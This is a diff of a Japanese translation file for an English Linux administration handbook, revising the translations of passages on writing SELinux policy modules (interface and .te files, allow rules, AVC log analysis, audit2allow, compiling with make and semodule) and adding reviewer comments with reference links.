@@ -1244,7 +1244,7 @@ msgstr ""
 # Checked-By: Ryuunosuke Ayanokouzi;
 # Tag: L-CFMD;
 msgid "In the following example, we will thus try to create a profile for <command>/sbin/dhclient</command>. For this we will use <command>aa-genprof dhclient</command>. It will invite you to use the application in another window and when done to come back to <command>aa-genprof</command> to scan for AppArmor events in the system logs and convert those logs into access rules. For each logged event, it will make one or more rule suggestions that you can either approve or further edit in multiple ways:"
-msgstr "以下の例では、<command>/sbin/dhclient</command> 用のプロファイルを作成しようとしています。プロファイルを作成するためには <command>aa-genprof dhclient</command> を使います。<command>aa-genprof</command> はユーザに別のウィンドウから対象のアプリケーションを開始することを求め、その後ユーザにシステムログ内の AppArmor イベントを走査してこれらのログをアクセス規則に変換するために <command>aa-genprof</command> に戻ることを求めます。ログ記録されたそれぞれのイベントについて、<command>aa-genprof</command> は 1 つ以上の規則を提案します。ユーザは提案された規則を受け入れるかまたはさまざまな方法で規則を編集することが可能です。"
+msgstr "以下の例では、<command>/sbin/dhclient</command> 用のプロファイルを作成しようとしています。プロファイルを作成するためには <command>aa-genprof dhclient</command> を使います。<command>aa-genprof</command> はユーザに別のウィンドウから対象のアプリケーションを開始することを求め、その後ユーザにシステムログ内の AppArmor イベントをスキャンしてこれらのログをアクセス規則に変換するために <command>aa-genprof</command> に戻ることを求めます。ログ記録されたそれぞれのイベントについて、<command>aa-genprof</command> は 1 つ以上の規則を提案します。ユーザは提案された規則を受け入れるかまたはさまざまな方法で規則を編集することが可能です。"
 
 # Checked-By: Ryuunosuke Ayanokouzi;
 # Tag: L-CFMD;
@@ -2152,6 +2152,8 @@ msgstr "それぞれのインターフェースは <filename>.te</filename> フ�
 msgid "<filename>example.if</filename> File"
 msgstr "<filename>example.if</filename> ファイル"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Ref: http://selinuxproject.org/page/NB_RefPolicy#interface_Macro;
 msgid ""
 "## &lt;summary&gt;Myapp example policy&lt;/summary&gt;\n"
 "## &lt;desc&gt;\n"
@@ -2204,19 +2206,19 @@ msgid ""
 "        allow $1 myapp_log_t:file r_file_perms;\n"
 "')"
 msgstr ""
-"## &lt;summary&gt;Myapp example policy&lt;/summary&gt;\n"
+"## &lt;summary&gt;myapp ポリシーの一例&lt;/summary&gt;\n"
 "## &lt;desc&gt;\n"
 "##      &lt;p&gt;\n"
-"##              More descriptive text about myapp.  The &lt;desc&gt;\n"
-"##              tag can also use &lt;p&gt;, &lt;ul&gt;, and &lt;ol&gt;\n"
-"##              html tags for formatting.\n"
+"##              ここには myapp に関する追加説明を書きます。\n"
+"##              &lt;desc&gt; タグの中では書式指定をするために\n"
+"##              &lt;p&gt;、&lt;ul&gt;、&lt;ol&gt; html タグを使えます。\n"
 "##      &lt;/p&gt;\n"
 "##      &lt;p&gt;\n"
-"##              This policy supports the following myapp features:\n"
+"##              本ポリシーは myapp の以下に示す機能を動作させるために必要です。\n"
 "##              &lt;ul&gt;\n"
-"##              &lt;li&gt;Feature A&lt;/li&gt;\n"
-"##              &lt;li&gt;Feature B&lt;/li&gt;\n"
-"##              &lt;li&gt;Feature C&lt;/li&gt;\n"
+"##              &lt;li&gt;機能 A&lt;/li&gt;\n"
+"##              &lt;li&gt;機能 B&lt;/li&gt;\n"
+"##              &lt;li&gt;機能 C&lt;/li&gt;\n"
 "##              &lt;/ul&gt;\n"
 "##      &lt;/p&gt;\n"
 "## &lt;/desc&gt;\n"
@@ -2224,10 +2226,10 @@ msgstr ""
 "\n"
 "########################################\n"
 "## &lt;summary&gt;\n"
-"##      Execute a domain transition to run myapp.\n"
+"##      myapp を実行するために SELinux ドメインを遷移させます。\n"
 "## &lt;/summary&gt;\n"
 "## &lt;param name=\"domain\"&gt;\n"
-"##      Domain allowed to transition.\n"
+"##      遷移を許可する SELinux ドメイン。\n"
 "## &lt;/param&gt;\n"
 "#\n"
 "interface(`myapp_domtrans',`\n"
@@ -2240,10 +2242,10 @@ msgstr ""
 "\n"
 "########################################\n"
 "## &lt;summary&gt;\n"
-"##      Read myapp log files.\n"
+"##      myapp のログファイルを読み込みます。\n"
 "## &lt;/summary&gt;\n"
 "## &lt;param name=\"domain\"&gt;\n"
-"##      Domain allowed to read the log files.\n"
+"##      myapp のログファイルの読み込みを許可する SELinux ドメイン。\n"
 "## &lt;/param&gt;\n"
 "#\n"
 "interface(`myapp_read_log',`\n"
@@ -2255,30 +2257,47 @@ msgstr ""
 "        allow $1 myapp_log_t:file r_file_perms;\n"
 "')"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<emphasis>DOCUMENTATION</emphasis> Explanations about the <emphasis>reference policy</emphasis>"
 msgstr "<emphasis>DOCUMENTATION</emphasis> <emphasis>リファレンスポリシー</emphasis>に関する説明"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Tag: L-CFMD;
 msgid "The <emphasis>reference policy</emphasis> evolves like any free software project: based on volunteer contributions. The project is hosted by Tresys, one of the most active companies in the SELinux field. Their wiki contains explanations on how the rules are structured and how you can create new ones. <ulink type=\"block\" url=\"https://github.com/TresysTechnology/refpolicy/wiki/GettingStarted\" />"
-msgstr "SELinux の<emphasis>リファレンスポリシー</emphasis>はフリーソフトウェアプロジェクトのように発展しています。すなわち、ボランティアからの貢献が発展を支えています。このプロジェクトは Tresys によってホストされています。Tresys は SELinux 分野における最も活発な企業の 1 つです。Tresys の wiki には、ルールを構築する方法と新しいルールを作成する方法が説明されています。<ulink type=\"block\" url=\"https://github.com/TresysTechnology/refpolicy/wiki/GettingStarted\" />"
+msgstr "SELinux の<emphasis>リファレンスポリシー</emphasis>はフリーソフトウェアプロジェクトのように発展しています。すなわち、ボランティアの貢献が発展を支えています。このプロジェクトは Tresys によってホストされています。Tresys は SELinux 分野における最も活発な企業の 1 つです。Tresys の wiki には、ルールを構築する方法と新しいルールを作成する方法が説明されています。<ulink type=\"block\" url=\"https://github.com/TresysTechnology/refpolicy/wiki/GettingStarted\" />"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Writing a <filename>.te</filename> File"
 msgstr "<filename>.te</filename> ファイルの書き方"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Have a look at the <filename>example.te</filename> file:"
-msgstr "<filename>example.te</filename> を見てみましょう。"
+msgstr "それでは <filename>example.te</filename> を見てみましょう。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<emphasis>GOING FURTHER</emphasis> The <command>m4</command> macro language"
 msgstr "<emphasis>GOING FURTHER</emphasis> <command>m4</command> マクロ言語"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Tag: L-CFMD;
 msgid "To properly structure the policy, the SELinux developers used a macro-command processor. Instead of duplicating many similar <emphasis>allow</emphasis> directives, they created “macro functions” to use a higher-level logic, which also results in a much more readable policy."
 msgstr "適切にポリシーを構築するために、SELinux 開発者はマクロコマンドプロセッサを使いました。数多くの類似した <emphasis>allow</emphasis> 指示文を複製する代わりに、SELinux 開発者は高レベル論理を取り扱う「マクロ関数」を作成しました。「マクロ関数」のおかげで、ポリシーがとても読みやすくなりました。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Tag: L-CFMD;
+# Tag: PTAL;
+# Ref: https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/4/html/SELinux_Guide/rhlcommon-section-0053.html;
 msgid "In practice, <command>m4</command> is used to compile those rules. It does the opposite operation: it expands all those high-level directives into a huge database of <emphasis>allow</emphasis> directives."
-msgstr "具体的に言えば、<command>m4</command> はルールをまとめるために使われます。マクロ関数は反対の操作を行います。つまり、マクロ関数はすべての高レベル指示文を <emphasis>allow</emphasis> 指示文の巨大データベースに展開します。"
+msgstr "具体的に言えば、<command>m4</command> は複数のルール群から構成されるポリシーを構築するために使われます。マクロ関数は複数のルール群を 1 つの高レベル論理にまとめたものです。つまり、<command>m4</command> はマクロ関数で記述された高レベル論理を <emphasis>allow</emphasis> 指示文の巨大データベースに展開します。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Tag: L-CFMD;
+# Ref: $ less /usr/share/selinux/default/include/support/loadable_module.spt;
 msgid "The SELinux “interfaces” are only macro functions which will be substituted by a set of rules at compilation time. Likewise, some rights are in fact sets of rights which are replaced by their values at compilation time."
-msgstr "SELinux「インターフェース」はコンパイル時にルールの集合に置換されるただのマクロ関数です。同様に、実際のところ、いくつかの権限はコンパイル時に権限の値に置換される権限の集合に過ぎません。"
+msgstr "<filename>example.if</filename> ファイルの例で使用した SELinux「interface」は単なるマクロ関数であり、<command>m4</command> によるコンパイル時にルール群に置換されます。同様に、実際のところいくつかのパーミッションは単なるパーミッションの集合であり、<command>m4</command> によるコンパイル時にパーミッションの集合に置換されます。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Tag: L-CFMD;
 msgid ""
 "policy_module(myapp,1.0.0) <co id=\"example.te.module\"></co>\n"
 "\n"
@@ -2312,7 +2331,7 @@ msgstr ""
 "\n"
 "########################################\n"
 "#\n"
-"# Declarations\n"
+"# SELinux タイプと SELinux ドメインの宣言\n"
 "#\n"
 "\n"
 "type myapp_t; <co id=\"example.te.type\"></co>\n"
@@ -2328,7 +2347,7 @@ msgstr ""
 "\n"
 "########################################\n"
 "#\n"
-"# Myapp local policy\n"
+"# myapp のローカルポリシー\n"
 "#\n"
 "\n"
 "allow myapp_t myapp_log_t:file { read_file_perms append_file_perms }; <co id=\"example.te.allow\"></co>\n"
@@ -2336,282 +2355,394 @@ msgstr ""
 "allow myapp_t myapp_tmp_t:file manage_file_perms;\n"
 "files_tmp_filetrans(myapp_t,myapp_tmp_t,file)"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Ref: http://selinuxproject.org/page/NB_RefPolicy#policy_module_Macro
 msgid "The module must be identified by its name and version number. This directive is required."
-msgstr "モジュールは名前とバージョン番号で識別されます。この指示文は必須です。"
+msgstr "モジュールは名前とバージョン番号で識別されます。policy_module マクロは必須です。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Ref: http://selinuxproject.org/page/TypeStatements
 msgid "If the module introduces new types, it must declare them with directives like this one. Do not hesitate to create as many types as required rather than granting too many useless rights."
-msgstr "モジュールによって新しい SELinux タイプが導入される場合、この種の指示文を使って新しい SELinux タイプを必ず宣言してください。多くの無駄な権限を与えるのでなく、必要な多くの SELinux タイプを作成してください。遠慮はいりません。"
+msgstr "モジュールによって新しい SELinux タイプが導入される場合、type 文を使って新しい SELinux タイプを必ず宣言してください。多くの無駄な権限を与えるのでなく、必要な SELinux タイプをすべて作成してください。遠慮はいりません。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Ref: $ less /usr/share/selinux/default/include/kernel/domain.if;
+# Ref: http://selinuxproject.org/page/RefpolicyBasicRoleCreation;
+# Ref: https://github.com/TresysTechnology/refpolicy/blob/master/policy/modules/system/userdomain.te;
 msgid "Those interfaces define the <literal>myapp_t</literal> type as a process domain that should be used by any executable labeled with <literal>myapp_exec_t</literal>. Implicitly, this adds an <literal>exec_type</literal> attribute on those objects, which in turn allows other modules to grant rights to execute those programs: for instance, the <literal>userdomain</literal> module allows processes with domains <literal>user_t</literal>, <literal>staff_t</literal>, and <literal>sysadm_t</literal> to execute them. The domains of other confined applications will not have the rights to execute them, unless the rules grant them similar rights (this is the case, for example, of <command>dpkg</command> with its <literal>dpkg_t</literal> domain)."
-msgstr "これらのインターフェースは <literal>myapp_exec_t</literal> とラベリングされた実行ファイルによって使われるプロセスの SELinux ドメインとして <literal>myapp_t</literal> SELinux タイプを定義します。暗黙のうちに、これはオブジェクトに <literal>exec_type</literal> 属性を追加します。このおかげで、他のモジュールは <literal>myapp_exec_t</literal> とラベリングされたプログラムを実行する権限を取得することが可能になります。たとえば、<literal>userdomain</literal> モジュールを使うことで、<literal>user_t</literal>、<literal>staff_t</literal>、<literal>sysadm_t</literal> SELinux ドメインを持つプロセスは自分を実行することが可能になります。他の閉じ込められたアプリケーションの SELinux ドメインは、その SELinux ドメインに割り当てられたルールが同様の権限を取得しない限り (たとえば <literal>dpkg_t</literal> SELinux ドメインを持つ <command>dpkg</command> がこの場合に相当します)、<literal>myapp_exec_t</literal> とラベリングされたプログラムを実行する権限を持ちません。"
+msgstr "ここでは <literal>domain_type</literal> および <literal>domain_entry_file</literal> インターフェースを使って、<literal>myapp_exec_t</literal> とラベリングされた実行ファイルによって使われるプロセスの SELinux ドメインとして <literal>myapp_t</literal> SELinux タイプを定義しています。こうすることで、暗黙のうちにオブジェクトに <literal>exec_type</literal> 属性が追加されます。このおかげで、他のモジュールは <literal>myapp_exec_t</literal> とラベリングされたプログラムを実行する権限を取得することが可能になります。たとえば <literal>userdomain</literal> モジュールを使うことで、<literal>user_t</literal>、<literal>staff_t</literal>、<literal>sysadm_t</literal> SELinux ドメインを持つプロセスが自分を実行することが可能になります。他の閉じ込められたアプリケーションの SELinux ドメインは、その SELinux ドメインに割り当てられたルールが同様の権限を取得しない限り (たとえば <literal>dpkg_t</literal> SELinux ドメインを持つ <command>dpkg</command> がこの場合に相当します)、<literal>myapp_exec_t</literal> とラベリングされたプログラムを実行する権限を持ちません。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Ref: $ less /usr/share/selinux/default/include/system/logging.if;
 msgid "<literal>logging_log_file</literal> is an interface provided by the reference policy. It indicates that files labeled with the given type are log files which ought to benefit from the associated rules (for example granting rights to <command>logrotate</command> so that it can manipulate them)."
-msgstr "<literal>logging_log_file</literal> はリファレンスポリシーによって提供されるインターフェースです。これは指定された SELinux タイプでラベリングされたファイルは SELinux タイプに対応するルールから恩恵を受ける義務があるログファイルであることを表します (たとえば、<command>logrotate</command> がログファイルを処理することを可能にするために、<command>logrotate</command> に権限を与えます)。"
+msgstr "<literal>logging_log_file</literal> はリファレンスポリシーによって提供されるインターフェースです。これは指定された SELinux タイプでラベリングされたファイルはその SELinux タイプに対応するルールから恩恵を受ける義務があるログファイルであることを表します (たとえば、<command>logrotate</command> がログファイルを処理することを可能にするために、<command>logrotate</command> に権限を与える場合に使います)。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Ref: http://selinuxproject.org/page/PolicyLanguage;
+# Ref: http://selinuxproject.org/page/AVCRules;
 msgid "The <literal>allow</literal> directive is the base directive used to authorize an operation. The first parameter is the process domain which is allowed to execute the operation. The second one defines the object that a process of the former domain can manipulate. This parameter is of the form “<replaceable>type</replaceable>:<replaceable>class</replaceable>“ where <replaceable>type</replaceable> is its SELinux type and <replaceable>class</replaceable> describes the nature of the object (file, directory, socket, fifo, etc.). Finally, the last parameter describes the permissions (the allowed operations)."
 msgstr "<literal>allow</literal> 指示文は操作を許可するために使われる基本的な指示文です。1 番目のパラメータはこの操作を実行することを許されたプロセスの SELinux ドメインです。2 番目のパラメータは 1 番目のパラメータで指定した SELinux ドメインのプロセスが操作することが可能なオブジェクトを定義します。2 番目のパラメータは「<replaceable>type</replaceable>:<replaceable>class</replaceable>」の形で定義します。ここで <replaceable>type</replaceable> は SELinux タイプで <replaceable>class</replaceable> はオブジェクトの種類 (ファイル、ディレクトリ、ソケット、名前付きパイプなど) です。最後に、3 番目のパラメータはパーミッション (許可された操作) を表現します。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Ref: http://selinuxproject.org/page/AVCRules;
+# Ref: /usr/share/selinux/devel/include/support/obj_perm_sets.spt
 msgid "Permissions are defined as the set of allowed operations and follow this template: <literal>{ <replaceable>operation1</replaceable> <replaceable>operation2</replaceable> }</literal>. However, you can also use macros representing the most useful permissions. The <filename>/usr/share/selinux/devel/include/support/obj_perm_sets.spt</filename> lists them."
 msgstr "パーミッションは許可された操作の一式として定義され、以下のテンプレートに従います。すなわち <literal>{ <replaceable>operation1</replaceable> <replaceable>operation2</replaceable> }</literal> です。しかしながら、最も役に立つパーミッションを表すマクロを使うことも可能です。<filename>/usr/share/selinux/devel/include/support/obj_perm_sets.spt</filename> には、最も役に立つパーミッションのマクロが説明されています。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "The following web page provides a relatively exhaustive list of object classes, and permissions that can be granted. <ulink type=\"block\" url=\"http://www.selinuxproject.org/page/ObjectClassesPerms\" />"
 msgstr "以下のウェブページでは、オブジェクトクラスと与えられるパーミッションの比較的包括的なリストが載せられています。<ulink type=\"block\" url=\"http://www.selinuxproject.org/page/ObjectClassesPerms\" />"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Now you just have to find the minimal set of rules required to ensure that the target application or service works properly. To achieve this, you should have a good knowledge of how the application works and of what kind of data it manages and/or generates."
-msgstr "そして、対象のアプリケーションやサービスが正しく動くために必要な最低限のルールセットを見つけ出さなければいけません。これを行うには、アプリケーションの動作方法とアプリケーションが管理および生成するデータの種類に関する詳しい知識が必要です。"
+msgstr "さらに、対象のアプリケーションやサービスが正しく動くために必要な最低限のルールセットを見つけ出さなければいけません。これを行うには、アプリケーションの動作方法とアプリケーションが管理および生成するデータの種類に関する詳しい知識が必要です。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "However, an empirical approach is possible. Once the relevant objects are correctly labeled, you can use the application in permissive mode: the operations that would be forbidden are logged but still succeed. By analyzing the logs, you can now identify the operations to allow. Here is an example of such a log entry:"
 msgstr "しかしながら、経験的なアプローチが使えます。対応するオブジェクトに対する正しいラベリングが終わっていれば、アプリケーションを permissive モードで使うことが可能です。そして permissive モードでは、禁止されるであろう操作はログ記録されて実行されます。このログを解析することで、許可する操作を識別することが可能になります。以下は permissive モードでアプリケーションを動かした場合に記録されるログエントリの例です。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "avc:  denied  { read write } for  pid=1876 comm=\"syslogd\" name=\"xconsole\" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file permissive=1"
 msgstr "avc:  denied  { read write } for  pid=1876 comm=\"syslogd\" name=\"xconsole\" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file permissive=1"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Ref: https://wiki.gentoo.org/wiki/SELinux/Tutorials/Where_to_find_SELinux_permission_denial_details;
 msgid "To better understand this message, let us study it piece by piece."
 msgstr "このメッセージをより詳しく理解するために、それぞれの要素について勉強しましょう。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Analysis of an SELinux trace"
-msgstr "SELinux メッセージの解析"
+msgstr "SELinux ログエントリの解析"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Message"
 msgstr "メッセージ"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Description"
 msgstr "説明"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<computeroutput>avc: denied</computeroutput>"
 msgstr "<computeroutput>avc: denied</computeroutput>"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "An operation has been denied."
 msgstr "操作が拒否されました。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<computeroutput>{ read write }</computeroutput>"
 msgstr "<computeroutput>{ read write }</computeroutput>"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "This operation required the <literal>read</literal> and <literal>write</literal> permissions."
 msgstr "この操作には <literal>read</literal> と <literal>write</literal> パーミッションが必要です。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<computeroutput>pid=1876</computeroutput>"
 msgstr "<computeroutput>pid=1876</computeroutput>"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "The process with PID 1876 executed the operation (or tried to execute it)."
 msgstr "PID 1876 のプロセスがこの操作を実行しました (または実行を試行しました)。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<computeroutput>comm=\"syslogd\"</computeroutput>"
 msgstr "<computeroutput>comm=\"syslogd\"</computeroutput>"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "The process was an instance of the <literal>syslogd</literal> program."
 msgstr "プロセスは <literal>syslogd</literal> プログラムのインスタンスです。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<computeroutput>name=\"xconsole\"</computeroutput>"
 msgstr "<computeroutput>name=\"xconsole\"</computeroutput>"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "The target object was named <literal>xconsole</literal>. Sometimes you can also have a “path” variable — with the full path — instead."
 msgstr "対象のオブジェクトは <literal>xconsole</literal> と名付けられました。場合によってはこれの代わりにフルパスを含む「path」変数が設定されていることもあります。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<computeroutput>dev=tmpfs</computeroutput>"
 msgstr "<computeroutput>dev=tmpfs</computeroutput>"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "The device hosting the target object is a <literal>tmpfs</literal> (an in-memory filesystem). For a real disk, you could see the partition hosting the object (for example: “sda3”)."
 msgstr "対象のオブジェクトをホストしているデバイスは <literal>tmpfs</literal> (メモリ内ファイルシステム) です。実ディスクの場合、オブジェクトをホストしているパーティション (たとえば「sda3」) になります。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<computeroutput>ino=5510</computeroutput>"
 msgstr "<computeroutput>ino=5510</computeroutput>"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "The object is identified by the inode number 5510."
 msgstr "オブジェクトは inode 番号 5510 で識別されています。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<computeroutput>scontext=system_u:system_r:syslogd_t:s0</computeroutput>"
 msgstr "<computeroutput>scontext=system_u:system_r:syslogd_t:s0</computeroutput>"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "This is the security context of the process who executed the operation."
 msgstr "これは操作を実行したプロセスのセキュリティコンテキストです。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<computeroutput>tcontext=system_u:object_r:device_t:s0</computeroutput>"
 msgstr "<computeroutput>tcontext=system_u:object_r:device_t:s0</computeroutput>"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "This is the security context of the target object."
 msgstr "これは対象オブジェクトのセキュリティコンテキストです。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<computeroutput>tclass=fifo_file</computeroutput>"
 msgstr "<computeroutput>tclass=fifo_file</computeroutput>"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "The target object is a FIFO file."
 msgstr "対象オブジェクトは FIFO ファイルです。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Tag: L-CFMD;
 msgid "By observing this log entry, it is possible to build a rule that would allow this operation. For example: <literal>allow syslogd_t device_t:fifo_file { read write }</literal>. This process can be automated, and it's exactly what the <command>audit2allow</command> command (of the <emphasis role=\"pkg\">policycoreutils</emphasis> package) offers. This approach is only useful if the various objects are already correctly labeled according to what must be confined. In any case, you will have to carefully review the generated rules and validate them according to your knowledge of the application. Effectively, this approach tends to grant more rights than are really required. The proper solution is often to create new types and to grant rights on those types only. It also happens that a denied operation isn't fatal to the application, in which case it might be better to just add a “<literal>dontaudit</literal>” rule to avoid the log entry despite the effective denial."
-msgstr "ログエントリを観察することで、その操作を許可するために必要なルールを構築することが可能です。たとえば <literal>allow syslogd_t device_t:fifo_file { read write }</literal> です。この作業は自動化することが可能です。これが <command>audit2allow</command> コマンド (<emphasis role=\"pkg\">policycoreutils</emphasis> パッケージに含まれます) の役割です。設定する必要のある内容に応じて、さまざまなオブジェクトが既に正しくラベリングされている場合にのみ、このアプローチは役に立ちます。いずれにせよ、管理者は必ず、生成されたルールを注意深く確認し、アプリケーションに対する知識に基づいてルールの妥当性を検査しなければいけません。事実上、このアプローチはアプリケーションが本当に必要としている権限よりも多くの権限を与えようとします。ほとんどの場合、新しい SELinux タイプを作成し、作成した SELinux タイプだけに権限を与えることが適切な解決策と言えます。また、拒否された操作がアプリケーションにとって致命的でない場合もあります。この場合、「<literal>dontaudit</literal>」ルールを追加するだけに留めることがより良い解決策かもしれません。こうすることで、実際の実行を拒否するのではなくログエントリの記録だけが拒否されます。"
+msgstr "SELinux ログエントリを観察することで、その操作を許可するために必要なルールを構築することが可能です。たとえば例に挙げた操作を許可するルールは <literal>allow syslogd_t device_t:fifo_file { read write }</literal> のようになります。この作業は自動化することが可能です。これが <command>audit2allow</command> コマンド (<emphasis role=\"pkg\">policycoreutils</emphasis> パッケージに含まれます) の役割です。設定する必要のある内容に応じてさまざまなオブジェクトが既に正しくラベリングされている場合にのみ、このアプローチは役に立ちます。いずれにせよ、管理者は必ず生成されたルールを注意深く確認し、アプリケーションに対する知識に基づいてルールの妥当性を検査しなければいけません。事実上、このアプローチはアプリケーションが本当に必要としている権限よりも多くの権限を与えようとします。ほとんどの場合、新しい SELinux タイプを作成し、作成した SELinux タイプだけに権限を与えることが適切な解決策と言えます。また、拒否された操作がアプリケーションにとって致命的でない場合もあります。この場合、「<literal>dontaudit</literal>」ルールを追加するだけに留めることがより良い解決策かもしれません。こうすることで、実際の実行を拒否するのではなくログエントリの記録だけが拒否されます。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<emphasis>COMPLEMENTS</emphasis> No roles in policy rules"
 msgstr "<emphasis>COMPLEMENTS</emphasis> SELinux ロールを設定されていないポリシールール"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<primary>Type Enforcement</primary>"
 msgstr "<primary>Type Enforcement</primary>"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "<primary>Enforcement, Type Enforcement</primary>"
 msgstr "<primary>強制、Type Enforcement</primary>"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "It might seem weird that roles do not appear at all when creating new rules. SELinux uses only the domains to find out which operations are allowed. The role intervenes only indirectly by allowing the user to switch to another domain. SELinux is based on a theory known as <emphasis>Type Enforcement</emphasis> and the type is the only element that matters when granting rights."
-msgstr "新しいルールを作成した際に、SELinux ロールが 1 つも設定されていないことは不思議に見えるかもしれません。SELinux は許されている操作の見つかった SELinux ドメインだけを使います。SELinux ロールは、ユーザが他の SELinux ドメインに切り替えることを許可することで、間接的に介在するだけです。SELinux は <emphasis>Type Enforcement</emphasis> として知られる理論に基づき、SELinux タイプは権限を獲得する際に考慮される唯一の要素です。"
+msgstr "新しいルールを作成した際に、SELinux ロールが 1 つも設定されていないことは不思議に見えるかもしれません。SELinux は許されている操作の見つかった SELinux ドメインだけを使います。SELinux ロールはユーザが他の SELinux ドメインに切り替えることを許可することで間接的に権限処理に介在するだけです。SELinux は <emphasis>Type Enforcement</emphasis> として知られる理論に基づいており、権限を獲得する際に考慮される要素は SELinux タイプだけです。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Compiling the Files"
 msgstr "ファイルのコンパイル"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
+# Tag: L-CFMD;
+# Ref: https://www.gnu.org/s/make/manual/html_node/Flavors.html;
 msgid "Once the 3 files (<filename>example.if</filename>, <filename>example.fc</filename>, and <filename>example.te</filename>) match your expectations for the new rules, just run <command>make NAME=devel</command> to generate a module in the <filename>example.pp</filename> file (you can immediately load it with <command>semodule -i example.pp</command>). If several modules are defined, <command>make</command> will create all the corresponding <filename>.pp</filename> files."
-msgstr "3 個のファイル (<filename>example.if</filename>、<filename>example.fc</filename>、<filename>example.te</filename>) が新しいルールに関する管理者の期待と一致したら、<filename>example.pp</filename> ファイルの中で <command>make NAME=devel</command> を実行してモジュールを生成します (<command>semodule -i example.pp</command> を使ってすぐさまこのモジュールを読み込むことが可能です)。複数のモジュールを定義した場合、<command>make</command> はすべての対応する <filename>.pp</filename> ファイルを生成します。"
+msgstr "3 個のファイル (<filename>example.if</filename>、<filename>example.fc</filename>、<filename>example.te</filename>) が新しいルールに関する管理者の期待と一致したら、<command>make NAME=devel</command> を実行して <filename>example.pp</filename> ファイルの形でモジュールを生成します (<command>semodule -i example.pp</command> を使ってすぐさまこのモジュールをインストールすることが可能です)。複数のモジュールを定義した場合、<command>make</command> はすべての対応する <filename>.pp</filename> ファイルを生成します。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Other Security-Related Considerations"
 msgstr "セキュリティ関連で他に考慮すべき点"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Security is not just a technical problem; more than anything, it is about good practices and understanding the risks. This section reviews some of the more common risks, as well as a few best practices which should, depending on the case, increase security or lessen the impact of a successful attack."
-msgstr "セキュリティとは単なる技術的問題ではありません。そしてセキュリティに関して最も重要なことは、良く練習すること、危険を理解すること、です。この節では、いくつかのより一般的な危険および最良の実践例を見直します。ここで挙げた事例を実践することで、セキュリティを向上させたり、攻撃が成功してもその影響を小さなものにすることが可能です。"
+msgstr "セキュリティとは単なる技術的問題ではありません。セキュリティに関して最も重要なことは十分に実践したり、危険を理解したりすることです。この節では、いくつかのより一般的な危険および最良の実践例を見直します。ここで挙げた事例を実践することで、セキュリティを向上させたり、攻撃が成功してもその影響を小さなものにしたりすることが可能です。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Inherent Risks of Web Applications"
 msgstr "ウェブアプリケーションの持つ潜在的危険性"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "The universal character of web applications led to their proliferation. Several are often run in parallel: a webmail, a wiki, some groupware system, forums, a photo gallery, a blog, and so on. Many of those applications rely on the “LAMP” (<emphasis>Linux, Apache, MySQL, PHP</emphasis>) stack. Unfortunately, many of those applications were also written without much consideration for security problems. Data coming from outside is, too often, used with little or no validation. Providing specially-crafted values can be used to subvert a call to a command so that another one is executed instead. Many of the most obvious problems have been fixed as time has passed, but new security problems pop up regularly."
